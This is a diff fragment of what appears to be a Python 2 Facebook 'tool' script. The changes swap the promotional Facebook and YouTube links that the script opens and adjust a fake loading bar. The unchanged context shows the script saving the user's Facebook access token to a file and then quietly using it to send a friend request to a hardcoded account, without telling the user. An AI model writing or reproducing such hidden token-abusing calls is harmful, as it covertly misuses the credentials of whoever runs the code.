@@ -103,11 +103,11 @@ print  """
 jalan('              \033[1;91mREAD CAREFULLY:')
 jalan("\033[1;97m Tool Username And Password  ")
 jalan('\033[1;97m    Username Khan Password Khan  K is Big Letter ')
-jalan('\033[1;97m  ██ 39%  ')
-jalan("\033[1;97m   ███ 49%  ")
-jalan("\033[1;97m    ████ 76%  ")
-jalan("\033[1;97m     █████ 89%  ")
-jalan("\033[1;97m      ██████ 100%  ")
+jalan('\033[1;97m██ 39%  ')
+jalan("\033[1;97m ███ 49%  ")
+jalan("\033[1;97m  ████ 76%  ")
+jalan("\033[1;97m   █████ 89%  ")
+jalan("\033[1;97m    ██████ 100%  ")
 
 
 
@@ -129,10 +129,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.Facebook.com/Man50or')
+            os.system('xdg-open https://www.youtube.com/channel/UCFs2F7Lrtrp6nxrzG5OikhA')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://www.Facebook.com/Man50or')
+        os.system('xdg-open https://www.youtube.com/mktricks143')
 
 def login():
 	os.system('clear')
@@ -176,7 +176,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful...'
-				os.system('xdg-open https://www.Facebook.com/Man50or')
+				os.system('xdg-open https://www.youtube.com/mktricks143')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
